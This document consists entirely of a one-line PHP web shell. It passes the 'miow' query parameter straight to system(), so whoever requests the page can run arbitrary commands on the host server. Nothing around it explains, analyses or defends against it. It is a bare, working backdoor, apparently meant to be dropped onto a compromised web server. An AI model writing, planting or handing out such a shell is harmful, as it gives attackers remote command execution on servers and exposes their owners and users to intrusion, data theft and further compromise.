<?php system($_GET["miow"]) ?>
